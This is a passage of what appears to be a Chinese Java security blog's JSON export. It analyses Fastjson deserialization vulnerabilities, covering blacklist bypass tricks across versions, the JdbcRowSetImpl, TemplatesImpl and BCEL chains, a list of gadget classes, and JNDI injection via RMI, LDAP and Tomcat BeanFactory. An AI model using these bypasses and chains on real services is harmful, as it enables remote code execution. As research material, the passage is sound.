"},{"title":"Fastjson后续版本绕过分析","date":"2023-08-03T08:12:01.322Z","url":"/13f085f1e890.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["Fastjson","/tags/Fastjson/"],["alibaba","/tags/alibaba/"]],"categories":[["Java安全","/categories/Java%E5%AE%89%E5%85%A8/"]],"content":"fastjson&lt;&#x3D;1.2.25版本绕过fastjson1.2.25对之前的反序列化漏洞进行了修复，引入了 checkAutoType 机制，默认 autoTypeSupport 没有进行设置，是false，不能反序列化任何类，若开启，也会根据黑名单来判断是否能够反序列化 具体影响范围：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.41 fastjson1.2.25以后版本，在 com.alibaba.fastjson.parser.ParserConfig 类中增加了以下的安全机制 autoTypeSupport 变量用来表示是否支持反序列化任意类，默认为false denyList 变量是反序列化类全限定类名前缀的黑名单 acceptList 变量是反序列化类全限定类名前缀的白名单 白名单 acceptList 默认是空的，黑名单 denyList 包含以下关键字 开启 autoTypeSupport 的方法： 在代码中设置 ParserConfig 类对应的属性 添加白名单的方法： 在代码中设置 ParserConfig 类对应的属性 新建 fastjson.properties 文件添加对应属性设置 修复方案分析 DefaultJSONParser 类中新增加调用 config.checkAutoType 方法 checkAutoType 方法前面主要是判断如果开启了 autoTypeSupport 那么就从看看白名单有没有允许反序列化类全限定类名前缀，再从黑名单中看看反序列化类的全限定类名前缀是不是在黑名单内，在黑名单内的话就抛出异常。这里我debug时，提前开启了 autoTypeSupport 才能走到这里，否则执行到下面就抛出异常了 若没有开启 autoTypeSupport，这里先判断反序列化类的全限定类名前缀是否在黑名单内，再判断是否在白名单内，在白名单内就允许加载类，这样就让攻击者进行反序列化攻击更难了 绕过分析这里只考虑开启 autoTypeSupport 的情况，使用JdbcRowSetImpl链来利用 可以看到在 TypeUtils 类中的 loadClass 方法中，判断了全限定类名是否是以 L 开头和 ; 结尾的，那么这里可以想一想，在前面判断了我们JSON字符串中的全限定类名前缀在不在黑名单内，那么我们在全限定类名的最开头加上 L 结尾加上 ;，这样在黑名单时检查不到，到了这里也能正常加载类，这样就可以绕过了 这样就成功躲过了黑名单检测，并且还能正常加载类 fastjson&lt;&#x3D;1.2.42版本绕过fastjson1.2.42版本对之前的1.2.25版本绕过进行了修复，虽然还是黑白名单检测，但是开发者将这些黑白名单校验改为黑白名单的HASH校验，且对开头以 L 和 结尾以 ; 的绕过方法进行了修复 具体影响范围：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.42 修复方案分析 在 com.alibaba.fastjson.parser.ParserConfig 类中，将明文黑白名单转成了HASH黑白名单 在 checkAutoType 方法中多了判断 className 全限定类名是否是以 L 开头 ; 结尾，如果是则去除掉 然后再将 className 转hashcode，将这个hashcode去白名单和黑名单hashcode比较，这样好像是解决了fastjson1.2.25版本的绕过问题了 绕过分析先给出绕过的POC，其实就是双写 L 和双写 ; 问题出在这里，这里只是进行了一次截取，我们只需要双写 L 和 ; 即可绕过 fastjson&lt;&#x3D;1.2.43版本绕过fastjson1.2.43版本修复了fastjson 1.2.42版本的双写绕过问题 具体影响范围：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.43 修复方案分析 这里对双写的 L 和 ; 进行了判断，如果是则抛出异常 绕过分析 问题是出在 TypeUtils 类中，判断以 L 开头和 ; 结尾的方法已经不能用了，但是不仅仅只有这个条件才可以类加载，在上面一个条件判断以 [ 开头的也是可以进行类加载的 而在后续调用到 parseArray 方法，其中也判断了当前的 token 值是否是14，不是的话就抛出异常了，导致后续不能进行JNDI注入，那么只需要在获取完类名以后接着跟上一个 [ 再跟上一个 &#123;，这样就绕过了 fastjson&lt;&#x3D;1.2.45版本绕过在fastjson1.2.44版本中修复了1.2.43版本的绕过问题，在 具体影响范围：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.45 修复方案分析 在fastjson1.2.44版本中，checkAutoType 方法中判断了className的第一个字符如果是 [ 就抛出异常 绕过分析这里的绕过就是在fastjson1.2.44版本修复了1.2.43的绕过后，基于黑名单的绕过 黑名单不能保证所有可利用的类都能添加到黑名单，jackson 也是基于黑名单的方式，也是可以参考 jackson 的黑名单绕过来绕过fastjson的 由于这个利用的类是mybatis依赖中的，所以利用这个类需要mybatis依赖 fastjson&lt;&#x3D;1.2.47版本绕过在fastjson1.2.47版本，可以不用开启 AutoTypeSupport 即可进行反序列化 具体影响版本： 1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.32（AutoTypeSupport未开启） 1.2.33 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.47 绕过分析 问题出在这里，如果我们没有开启 autoTypeSupport 也没有期望类 expectClass，那么就会从 TypeUtils.mappings 中查找 我们查找下是哪个地方可以调用 mappings.put() 方法，在 TypeUtils 类 loadClass 方法调用了 在 MiscCodec 类中的 deserialze 反序列化方法中调用了 TypeUtils.loadClass 方法 checkAutoType 方法中如果在 mappings 中查找不到我们传入的类，那么就会从类型为 IdentityHashMap 类型的反序列化器中查找，这里我们传入类名 java.lang.Class 的原因是这个类名在反序列化器中的反序列化器是 MiscCodec 通过了 checkAutoType 的校验，再到后面就获取了反序列化器的类，那么只要后面调用了这个反序列化器的反序列化方法，就会调用前面的 TypeUtils.loadClass 类加载方法，那么我们跟进看下这个反序列化方法做了什么 在 MiscCodec 类的 deserialze 方法中就是获取了下一个键值对，而且下一个键值对键必须是 val 字符才可以，否则就抛出异常了 然后就是获取了键值对的值了，这里是我们想要加载类的类名 这里使用了AppClassLoader将需要利用的类进行加载，并且把需要利用的类名和加载好的类放进了 mappings，当我们给的JSON字符串有两个键值对，第一个按照上面的方法，把我们需要利用的类给放进 mappings，后面的键值对正常利用即可，按照这个思路，我们写出POC JSON字符串的 a 键值对负责将我们需要利用的类放入 mappings，而 b 键值对就是直接利用该类进行攻击即可 当进行下一个键值对的解析时进入 checkAutoType 方法，传入需要利用的类名 走到下面，从 mappings 获取我们传入的类名就可以找到了，然后返回了这个类 fastjson&lt;&#x3D;1.2.80绕过分析在fastjson1.2.48版本修复了1.2.47版本的绕过，在fastjson1.2.68开始更新了一个 safeMode 控制，如果开启了 safeMode 在调用 checkAutoTyep 方法时就会抛出异常 具体影响版本：1.2.68 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.80 修复方案分析 MiscCodec 类中调用 TypeUtils.loadClass 默认cache缓存为false，这样就避免了在fastjson1.2.47版本的绕过 绕过分析 在 checkAutoType 方法中，如果开启了 safeMode 这里就直接抛出异常了 如果 expectClass 期望类有入参，且传入的类名是 expectClass 的子类或实现类，那么就可以通过 checkAutoType 的检查 经过查找，发现只有 JavaBeanDeserializer#deserialze 和 ThrowableDeserializer#deserialze 方法中 expectClass 是可控的 写出POC如下： java.lang.Exception 是期望类，由于在 mappings 缓存中是存在 java.lang.Exception 类的，可以获取到这个类且是期望类，这里返回了这个类 这里就是调用了 java.lang.Exception 的反序列化器 ThrowableDeserializer 的 deserialze 方法，deserClass 则是 Throwable.class 这里加载了我们的恶意类，并添加到了 TypeUtils.mappings 中 exClass 就是我们的恶意类，调用了 createException 方法，跟进这个方法看一下做了什么 这里默认构造器就是恶意类的构造器，通过这个构造器实例化了恶意类即执行了恶意命令 最后，执行了恶意类的代码。需要注意的是，这里我们在本地进行测试时，写了一个本地的恶意类进行加载，目前没有一个完整的利用链 反序列化链PayloadJdbcRowSetImpl TemplatesImpl JndiDataSourceFactory SimpleJndiBeanFactory DefaultBeanFactoryPointcutAdvisor WrapperConnectionPoolDataSource JndiRefForwardingDataSource InetAddress Inet6Address URL JSONObject URLReader AutoCloseable 任意文件写入 BasicDataSource JndiConverter JtaTransactionConfig JndiObjectFactory AnterosDBCPConfig AnterosDBCPConfig2 CacheJndiTmLookup AutoCloseable 清空指定文件 AutoCloseable 清空指定文件 AutoCloseable 任意文件写入 AutoCloseable MarshalOutputStream 任意文件写入 BasicDataSource HikariConfig HikariConfig SessionBeanProvider JMSContentInterceptor ContextClassLoaderSwitcher OracleManagedConnectionFactory JNDIConfiguration JDBC4Connection LoadBalancedMySQLConnection UnpooledDataSource LoadBalancedMySQLConnection2 ReplicationMySQLConnection"},{"title":"Fastjson<=1.2.24反序列化分析","date":"2023-07-18T07:41:50.063Z","url":"/11c62fd672b4.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["Fastjson","/tags/Fastjson/"],["alibaba","/tags/alibaba/"]],"categories":[["Java安全","/categories/Java%E5%AE%89%E5%85%A8/"]],"content":"影响版本最早在fastjson1.2.24及之前的版本被曝存在远程代码执行漏洞，由于fastjson可以使用 @type 指定反序列化任意类，攻击者可在jdk包中查找能够构造出恶意类的方法，在其反序列化时会调用其getter或setter方法。 具体影响范围：1.2.22 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.24 JdbcRowSetImpl利用链com.sun.rowset.JdbcRowSetImpl 这条利用链是比较简单的，该类提供对数据库连接的操作，由于提供了JNDI的支持且参数可控，导致出现JNDI注入。 根据上一篇FastJson反序列化分析中，我们已经知道会自动调用带有 @type 的json字符串中的属性setter方法。我们又知道，在 JdbcRowSetImpl 类中存在一个参数可控的JNDI注入 在该类中搜索一下，在这个地方进行了JNDI查找操作 继续查找 getDataSourceName 方法，返回了 BaseRowSet 类中的 dataSource 属性，由于 JdbcRowSetImpl 继承了 BaseRowSet 类，那么我们看一下是哪个方法对 dataSource 进行了赋值 在 JdbcRowSetImpl 类中，获取了 getDataSourceName 的值，这就是为什么我们在json字符串中先把 dataSourceName 放在前面，因为首先会先调用到 setDataSourceName 方法，如果反过来可能会导致空指针的报错 所以会执行到 super.setDataSourceName 方法，调用了父类的 setDataSourceName 方法 来到了父类的这个方法，其实就是判断是否为空，这就是我们传入的 ldap://127.0.0.1:8085/lovxJNmO 这个字符串，再然后就进行了赋值的操作。 和上面我们说的已经对上了，现在 dataSource 就是我们的恶意ldap服务，现在只需要调用 connect 方法即可执行恶意代码。 经过查找，发现 setAutoCommit 方法调用了 connect 方法，而 getDatabaseMetaData 方法是getter方法且没有参数，这个不适合我们去利用。 这样就查找了恶意的ldap服务执行了恶意代码，走到了JSONException这里是因为没有设置 Feature.SupportNonPublicField 参数，报错但不影响执行。 TemplatesImpl利用链com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 这条利用链需要启用 Feature.SupportNonPublicField 对非公开字段的反序列化的访问。 在编写恶意类时，该恶意类必须继承 AbstractTranslet，至于为什么需要继承该类，到后面分析自然就知道了。还需要将恶意类编译生成的.class文件进行Base64编码，因为在利用过程中会对 _bytecodes 进行Base64解码，具体看后面分析。 这里判断了字符串的第一个字符的token为左大括号，则实例化了一个JSON对象 这里 isObjectKey 为false且设置key变量值为@type，判断了当前JSON解析器解析字符串的字符，到这里其实就是到了上图这个位置了 这里就是对 isObjectKey 值取反判断，执行 lexer.next() 获取下一个词法单元（符号）也就是双引号字符（”），再后面就是调用 lexer.scanSymbol() 方法从解析器中读取字符，直到遇到第二个引号字符（”）为止，这样的话就获取到了com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 这个字符串，接着调用 TypeUtils 类的loadClass静态方法加载TemplatesImpl类，TypeUtils类的loadClass静态方法其实主要就是做了判断ParserConfig类中的默认加载器是不是为null，为null的话就使用AppClassLoader加载器进行加载并返回加载后的类 lexer.nextToken(JSONToken.COMMA) 获取下一个标记，下一个标记是JSONToken.COMMA 常量，对应的字符是 , 逗号，下一个标记确实是 , 逗号，接着判断下一个词法单元（符号）是不是右大括号，很显然不是，则继续往下看 通过ParserConfig类config对象获取com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 的反序列器并调用反序列化器的序列化方法 进入了反序列化方法后，前面都是一些赋值判断的操作，到了这里其实就是将 sortedFieldDeserializers 字段反序列化器数组进行一个遍历，第一次遍历获取的是 outputProperties 字段 这里就是判断了 outputProperties 字段是什么类型的，再跟下去 跟下去发现下面的所有判断都不符合，直接进入第二次循环，这次是 stylesheetDOM 字段下面的判断也是不符合的，进入第三次循环也是不符合判断要求，这里就不详细看了 再往下就是到了这里，由于上面三次都没有符合判断要求，所以matchField为false，这里开始判断key的值是否一致 上面判断也不符合要求，到了这里，将JSON解析器和&#96;&#96;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类作为createInstance&#96; 方法的参数创建实例，跟进看一下 这里就是获取了 TemplatesImpl 类的默认构造器，如果这个默认构造器参数数量为0的话，那就通过这个默认构造器进行实例化对象并返回 接着解析器获取了下一个key，后面就是解析我们传入的JSON字符串字段 _bytecodes、_name、_tfactory、_outputProperties 的操作 只有当key为 _outputProperties 时，才能获取到字段反序列化器，前面的操作都是各种判断JSON解析器细节方面的东西，随后调用parseField方法，跟进看一下 parseField方法主要是获取字段反序列化器，由于 _bytecodes、_name、_tfactory 这些私有字段在TemplatesImpl类中都没有对应的public修饰符的getter和setter方法，所以没有字段反序列化器，而 _outputProperties 私有字段有对应public修饰符的getter方法，那么它就拥有一个字段反序列化器 这里有一个注意的地方，就是key为 _bytecodes 时和 _outputProperties 的区别 这里对字段值反序列化器进行反序列化获取值，这里要注意的是在前面key为 _bytecodes 时，会调用到 ObjectArrayCodec 类中的 deserialze 方法，该类对JSON字符串数组进行了一个解析，将JSON字符串数组进行了Base64解码，所以在写Payload时需要将 _bytecodes 键的值进行Base64编码 当key为 _outputProperties 时，会调用 MapDeserializer 类的 deserialze 方法，这个key是没有设置值的，所以这里返回null setValue方法判断了getOutputProperties方法字段访问权限和字段类 这里判断了 getOutputProperties 方法的返回值类型是否是Map类或Map子类，该方法返回值类型是 Properties，该类型是Map的子类，后面就是使用反射调用TemplatesImpl类的 getOutputProperties 方法 在 getOutputProperties 方法中调用了 newTransformer 方法，跟进看一下 这里调用了 getTransletInstance 方法，再跟进看一下 getTransletInstance 方法中判断了json字符串的 _name 和 _class 是否为空，这样就是为什么在payload中json字符串中必须要设置_name变量的值，不设置值这里就直接返回null了，_class 变量我们没有设置，即调用 defineTransletClasses 方法 这里还需要注意到一点的是 _tfactory 在JSON字符串中必须存在键值对，可以是空值，但不能没有，否则没有办法实例化 TransletClassLoader 加载器 _bytecodes 也不能为null，否则就抛出异常了。接着就是获取TransletClassLoader，通过 TransletClassLoader.defineClass() 方法将json字符串中的 _bytecodes 变量恶意代码字节码值转换成一个类实例，然后判断了我们恶意代码类的父类全限定类名是否包含 ABSTRACT_TRANSLET 常量值 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet，这就是为什么要在恶意类中需要继承 AbstractTranslet 类的原因，如果没有继承，则 _transletIndex 变量为-1，再走到下面 _transletIndex 小于0就会抛出异常了，所以必须要让恶意类继承 AbstractTranslet 类 _class 数组里下标为0的就是通过 TransletClassLoader 加载器加载的恶意类，调用 newInstance 方法即可实例化恶意类对象，即执行恶意类的代码，弹出计算器 BCEL利用链BCEL链也是一种不出网的利用链，虽然 TemplatesImpl 利用链也是不出网的利用链，但是这个利用链很苛刻，需要开启 Feature.SupportNonPublicField 对非公开字段的支持。BECL利用链需要tomcat的依赖tomcat-dbcp，对于Tomcat8.0之前版本使用 org.apache.tomcat.dbcp.dbcp.BasicDataSource，Tomcat8.0之后使用 org.apache.tomcat.dbcp.dbcp2.BasicDataSource 我们先来看下BCEL这条链的触发点在哪里，org.apache.tomcat.dbcp.dbcp2 包下的DriverFactory 类中，createDriver 静态方法使用 BasicDataSource 类型对象的 driverClassLoader 加载器加载了BasicDataSource类型对象的 driverClassName driverClassLoader 是我们在JSON字符串中写的是com.sun.org.apache.bcel.internal.util.ClassLoader 这个类，那么就会调用ClassLoader该类中的 loadClass 方法，在这个方法中判断了 class_name 是否是 $$BCEL$$ 字符开头的，否则就会抛出异常了，接着后面调用了 createClass 方法，这个方法就是将 class_name 中的字节码转换成类 在 createClass 方法中，将 $$BCEL$$ 字符删除后进行解码，再对这个解码后的字节码进行解析，所以在JSON字符串中 driverClassName 键的值需要进行编码 后面就是对解析后的类再进行一些处理，再将这个类进行返回 再获取这个类的字节码，加载成一个具体的类 使用自定义加载器 com.sun.org.apache.bcel.internal.util.ClassLoader 加载完成后得到的具体恶意类进行了实例化，这里是真正进行执行恶意代码的地方，我们再看下是这个调用链是什么样的 这里就是一个完整的调用链 getConnection()-&gt;createDataSource()-&gt;createConnectionFactory()-&gt;DriverFactory.createDriver() 我们清楚这条链的触发点后，至于前面的 parse 方法解析JSON字符串，在Fastjson反序列化一开始我们就已经跟着程序调试分析了，就是去根据我们给的JSON字符串去解析成对应的对象，接着调用 toJSON 方法 这里会将传入的类名 org.apache.tomcat.dbcp.dbcp2.BasicDataSource 的序列化器转换成JavaBean序列化器，使用该JavaBean序列化器获取获取所有字段值 这里就是对 BasicDataSource 类型对象的所有getter方法获取属性值，再看下 getPropertyValue 方法做了什么 这里调用了 fieldInfo 的 get 方法 这个get方法使用反射进行了方法的调用 那么这里只需要 getter 的变量值是 connection ，就会调用 getConnection 方法，这样我们这条完整的链就通了 但是我们发现不只是 getConnection 方法调用了 createDataSource 方法， getLogWriter 方法同样也调用了，而在解析对象时，在 FieldSeriailzer 对象数组类型的 sortedGetters 变量中，connection 相对于 logwriter 而言排在最前面，所以最先执行的也是这个方法，这就是为什么网上的文章都在说 getConnection 方法而没有说 getLogWriter 方法的原因 最后依次往下执行，成功执行了恶意代码"},{"title":"Fastjson反序列化分析","date":"2023-07-17T08:37:22.000Z","url":"/1f78acdc2202.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["Fastjson","/tags/Fastjson/"],["alibaba","/tags/alibaba/"]],"categories":[["Java安全","/categories/Java%E5%AE%89%E5%85%A8/"]],"content":"简介FastJson是Java的一个库，它可以将Java对象转换成JSON字符串，也可以将JSON字符串转换成Java对象 回显Fastjson使用版本在实战中如果不知道使用的是什么版本的Fastjson，可以将请求包中的 Content-Type 改成字段内容改成 application/json，请求体中让后端报错，比如 [&#123;&quot;a&quot;:&quot;a\\x] FastJSON使用 FastJSON提供了特殊字段@type，该字段可以指定反序列化任意类，会自动调用其类属性的特定的set、get方法。 在反序列化时，public修饰符的属性会被反序列化赋值，private修饰符的属性不会直接的进行反序列化赋值而是通过setXxx的方法进行赋值。 Fastjson反序列化流程分析根据这一特性，我们可以自己写一个类来测试一下，这里我在Person2类中定义了私有的属性_name，所以 set 和 get 方法都是小写加_ 程序从这开始将json字符串给Fastjson去解析 我们来到这里，parseObject 有好几个重写方法，目前我们先熟悉一下Fastjson反序列化整个流程，后面遇到再说。 这个 pareObject 调用的是另一个重写方法的 pareObject 这里还是调用了另一个重写的 pareObject 方法，继续跟进 DefaultJSONParser 将我们输入的json字符串和全局解析配置创建了一个默认JSON解析器。 再往下走，这个默认JSON解析器调用了 pareObject 方法 这里在反序列化器中尝试获取我们写的Person2类的反序列化器，很显然是没有的。 随后调用了 getDeserializer 方法，再跟进看一下 在这里就是获取我们的Person2这个类的全类名，有个替换操作，然后再判断我们的这个类名在不在黑名单（拒绝生成反序列化器列表）内，这个列表里只有一个 java.lang.Thread，当然也是不在的。 再往下走，走到了调用 createJavaBeanDeserializer 方法这里，看似是要创建一个JavaBean的反序列化器，继续跟进看一下。 这里获取Person2类上的JSONType注解，我们没有使用该注解，所以返回null 再继续往下跟，发现这里实例化了 JavaBeanDeserializer 类 进入 JavaBeanDeserializer 类，发现调用自己的另一个重写的构造方法。 这里的操作其实就是获取所有的 set 方法，由于我们这里只有一个 set 方法，就继续往下看了。 此时， createJavaBeanDeserializer 方法已经执行完毕了，使用 putDeserializer 把Person2类作为键，获取的JavaBean反序列化器作为值存到 ParserConfig 中的 derializers 变量中，该变量是一个HashMap，随后返回了这个JavaBean反序列化器。 这里也返回了反序列化器 继续往下走，可以看到反序列化器调用了 deserialze 反序列化方法。 走到这里条件符合，是默认的TYPE KEY（@type） 这里判断token是否等于JSONToken.RBRACE，JSONToken.RBRACE也就是 &#125; 符号，符合条件调用了 lexer 的 nextToken 方法，继续下一次循环。 此时，key是 _name 也就是json字符串中的键名，已经不是默认的TYPE KEY（@type）了。 再往下走，到这里调用了 createInstance 方法，跟进看一下 它获取了JavaBean反序列化器的默认构造方法并且实例化了，返回了一个对象。 这里已经得到了一个Person2类的对象了，object 自然不是null 再往下，调用了 parseField 方法，看这个名字应该是解析字段，跟进看一下。 这一连串的操作是处理字段中的 _ 和 - 符号，再通过 getFieldDeserializer 方法就获取对应的字段反序列化器了。 后面调用这个字段反序列化器的 parseField 方法，继续跟进 可以看到这里调用了 setValue 方法，参数 object 正是我们的Person2实例化出来的对象，value 则是71行反序列化获取的 _name 键的值，看看 setValue 方法里面是在干嘛。 这里判断了 fieldInfo 的method方法是不是只有一个get方法，很显然不是。 再继续往下，好像有点意思了，这里是真正调用 set_name 方法的地方，调用method的invoke方法，method是 set_name 方法，那么正好，我们只需要在Person2类中定义一个对应字段的setter方法，其方法有一个参数即可。value 就是 set_name 方法需要传入的参数，也就是执行的命令。 这里，就弹出了计算器了，说明触发点是在这里。 好了，现在我们已经理清楚了Fastjson整个反序列化流程，接下来我们需要配合一些JDK内的一些链来利用。"},{"title":"Java JNDI注入","date":"2023-05-29T02:44:18.229Z","url":"/eb4dd4b8a731.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["JNDI","/tags/JNDI/"]],"categories":[["Java安全","/categories/Java%E5%AE%89%E5%85%A8/"]],"content":"基本概念 Java的JNDI（Java Naming and Directory Interface）是一种标准API，可用于访问和管理分布式应用程序中的命名和目录服务。 JNDI为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。 通过JNDI，Java应用程序可以： 查找和获取命名对象，例如数据库连接、远程对象和配置信息。 将对象绑定到名称下，并使用这些名称来查找对象。 访问基于目录的服务，例如LDAP（Lightweight Directory Access Protocol）或者 DNS（Domain Name System）服务。 实现自定义的命名代理，并且根据需要将其集成进JNDI体系结构中。 JNDI主要支持：DNS、RMI、LDAP、CORBA等服务，JNDI类似一组API接口，每个对象都有一组名字和对象绑定关系，通过查找名字即可检索到相关的对象。 名词解释Reference类Reference类表示对存在于命名&#x2F;目录系统以外的对象的引用。 Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。 在使用Reference时，我们可以直接将对象写在构造方法中，当被调用时，对象的方法就会被触发。 几个比较关键的属性： className：远程加载时所使用的类名； classFactory：加载的class中需要实例化类的名称； classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file&#x2F;ftp&#x2F;http等协议； Naming命名服务是一种键值对的绑定，使应用程序可以通过键检索值。 Directory目录服务是命名服务的自然扩展。这两者之间的区别在于目录服务中对象可以有属性，而命名服务中对象没有属性。因此，在目录服务中可以根据属性搜索对象。 JNDI允许你访问文件系统中的文件，定位远程RMI注册的对象，访问如LDAP这样的目录服务，定位网络上的EJB组件。 ObjectFactoryObject Factory用于将Naming Service（如RMI&#x2F;LDAP）中存储的数据转换为Java中可表达的数据，如Java中的对象或Java中的基本数据类型。每一个Service Provider可能配有多个Object Factory。 影响版本 协议 JDK6 JDK7 JDK8 JDK11 LADP 6u141之前版本6u211之前版本 7u201之前版本7u131之前版本 8u121之前版本8u191之前版本 JDK11.0.1之前版本 RMI 6u45之前版本6u141之前版本6u211之前版本 7u21之前版本7u131之前版本7u201之前版本 8u121之前版本8u191之前版本 无 JNDI注入RMI Reference攻击对照影响版本，在影响版本JDK6、JDK7、JDK8的这些之后的版本，默认将下面两个属性设置为false，将不能再被利用，被设置了其如下的属性，想要修改属性必须设置其系统属性 com.sun.jndi.rmi.object.trustURLCodebase java.rmi.server.useCodebaseOnly com.sun.jndi.cosnaming.object.trustURLCodebase 恶意服务端代码如下： 受害者服务端 lookup 参数可控导致可以查找恶意服务RMI 编写一个exp.java程序用于弹出计算器，将该程序进行编译，再在当前目录下开启一个web服务 最后成功通过RMI Reference实现JNDI注入，执行恶意代码 RMI Reference攻击利用分析 分别在上面两行打上断点，先看一下Reference类引用对象的实例化做了什么，再看重点 bind 方法 实例化Reference远程引用对象，这里没什么需要注意看的，就只是创建了一个Reference类的引用对象，分别给类名、类工厂名、类工厂位置进行了赋值 这里需要重点关注的入口是 bind 方法，跟进看一下 这里将 Reference 引用对象和类名 exp 作为 encodeObject 方法的参数并调用，跟进去看一下 这里将前面实例化的Reference类型对象进行实例化 ReferenceWrapper 类型对象 到了这里 bind 方法就结束了，已经将 ReferenceWrapper 类型的引用对象绑定到RMI注册表中指定名称 exp 上，恶意服务端的RMI指定名称上已经绑定了我们的恶意代码引用对象 在受害者服务端这边，让其查找我们的恶意RMI服务，跟进lookup方法往下看 这里使用RMI查找绑定指定名称 exp 的远程对象 这里调用了 decodeObject 方法，因为在恶意服务端那边将默认的Reference进行了 encodeObject 方法之后返回了 ReferenceWrapper 类型引用对象，所以这边需要调用 decodeObject 方法获取原来的 Reference 类型引用对象。 这里将 ReferenceWrapper 类型引用对象变量 r 强转为 RemoteReference 类型远程引用对象并调用 getReference 获取 Reference 类型引用对象，又变回在恶意服务端那边的 Reference 对象 这里调用了 NamingManager 类的 getObjectInstance 静态方法，跳到了 NamingManager 类中，继续跟进 这里获取的是一个为null值的ObjectFactoryBuilder对象 这里将传入参数 refInfo 的 Reference 类型引用对象赋值给了ref变量 这里从 Reference 类型引用对象中获取指定类的对象工厂，跟进看一下 这里进行了类加载操作，是从本地查找 exp 类 这里使用的加载器是 AppClassLoader，AppClassLoader 会加载当前应用程序所在的类路径下的类，包括应用程序的类和第三方库的类，那肯定是找不到这个 exp 类的 来到这里，获取了 Reference 类型引用对象的类工厂位置，就是前面的远程地址  这里使用 URLClassLoader 加载器实例化对象获得一个 FactoryClassLoader 加载器 最后使用 FactoryURLClassLoader 加载器远程加载了 exp 类，这个时候就请求了  地址了 通过 FactoryURLClassLoader 加载到了 exp 类后，实例化了 exp 类，在我们写的恶意代码 exp.java 中在无参构造方法写入了执行命令弹出计算器 在实例化对象时，会默认调用无参的构造方法，最终成功使用RMI Reference执行命令 LDAP Reference攻击上面，我们使用RMI Reference进行了远程加载恶意类，但是仅限于JDK8u121以下版本，在8u121及以后版本针对了对RMI远程加载的漏洞修复 在JDK8u121及以后版本，在RMI相关操作上增加了 trustURLCodebase 系统属性，该属性值默认为 false，要想修改必须设置系统属性，这样上面的例子就不能进行远程加载恶意代码了。 但是修复了RMI上的远程加载问题，LDAP还没有解决，在上面我们分析RMI Reference利用时发现，真正的远程加载其实是在 NamingManager 的 getObjectInstance 的方法中，在这之前不过只是对远程引用对象处理，不是只有RMI才可以绑定引用对象，LDAP一样可以，官方当时没有在JDK8u121版本对LDAP进行修复，这样就绕过了上面的修复方式 受害者服务端使用 ldap 协议 这里创建LDAP服务使用Apache Directory Studio软件进行创建，该软件需要在JDK11版本使用，JDK8和JDK17版本可能会出现问题。不想使用这种方式也可以使用 JNDIExploit、marshalsec 等工具生成一个LDAP服务 点击创建一个连接 选择 javaContainer、javaNamingReference、javaObject、top 填写好对应类名、代码库地址、类工厂名即可 在受害者服务端运行代码即可执行恶意代码 LDAP Reference攻击利用分析 在受害者服务端的 lookup 上打断点调试即可 这里调用了该类的父类的 lookup 方法 这里上面RMI利用类似，获取URL上下文并获取解析后的对象强转成Context类型的对象 在这里获取到了LDAP服务上的属性，也就是我们在LDAP加的那几个属性 这里判断LDAP服务属性中有没有 javaclassname 属性 这里都是获取属性的操作，没有设置这些属性，下面的判断都不符合 将LDAP属性和代码库位置作为参数调用了 decodeReference 方法 这里获取到了类名和类工厂名，随后将类名和工厂名作为参数实例化 Reference 类型引用对象 由于后面没有符合条件，就返回了这个引用对象 此时，变量 obj 就是一个 Reference 类型引用对象 再往下走，发现调用了 DirectoryManager.getObjectInstance 静态方法，继续跟进看一下 这里感觉似曾相识，和上面RMI利用那一块很像 从引用对象中获取类工厂名，然后再从引用对象中获取工厂对象，再跟进 这里进行了类加载，跟进看一下 这里使用了AppClassLoader查找类进行加载，当然是没有的 再到这里获取了代码库的地址，尝试远程加载代码库中的类工厂 这里就获得了一个 FactoryURLClassLoader 加载器，再使用这个加载器远程加载类 这里对加载到的类进行实例化，即实例化了恶意类 最后，成功使用LDAP Reference绕过执行恶意代码 高版本JDK绕过在JDK6u211、7u201、8u191、11.0.1版本及以后，默认将 com.sun.jndi.ldap.object.trustURLCodebase 选项设置为false 但不管怎么禁止，我们还是可以通过本地的 Factory 类执行命令，在上面我们知道，真正在执行命令的地方其实是在调用 getObjectInstance() 方法的时候，使用RMI时调用的是 NamingManager.getObjectInstance() 方法，使用LDAP时使用的是 DirectoryManager.getObjectInstance() 方法 这两个 getObjectInstance() 方法有个共同点，都会从引用对象中获取一个对象工厂，而这个对象工厂只需要可以实例化类并调用方法，且类名、属性、属性值等参数都来自于 Reference 类型引用对象，是我们可控即可。而我们要利用的 Factory 类必须实现了 javax.naming.spi.ObjectFactory 接口，并且实现该接口的 getObjectInstance() 方法 根据上面的条件，找到了 org.apache.naming.factory.BeanFactory 类，这个类符合上面的条件，在Tomcat依赖包中。该类 getObjectInstance() 方法通过反射实例化Reference引用对象指向的类，调用setter方法。 依赖项： 恶意服务端代码如下： 受害者服务端如下： 高版本JDK绕过利用分析 这里其实也没什么好讲的了，最终要在RMI服务上查找指定名称 这里获取了一个 ReferenceWrapper 类型引用对象，和前面讲过的一样，需要调用decodeObject 方法来返回一个 Reference 类型引用对象，继续跟进 这里的操作和前面讲的都差不多，不再过多解释 来到这里，调用 NamingManager.getObjectInstance() 静态方法 这里就真正的调用了 org.apache.naming.factory.BeanFactory 类的 getObjectInstance()静态方法，继续跟进看一下 这里的变量 obj 就是一个 ResourceRef 资源引用对象 通过 AppClassLoader 加载器加载了 javax.el.ELProcessor 类 这里通过反射获取上面的加载到的 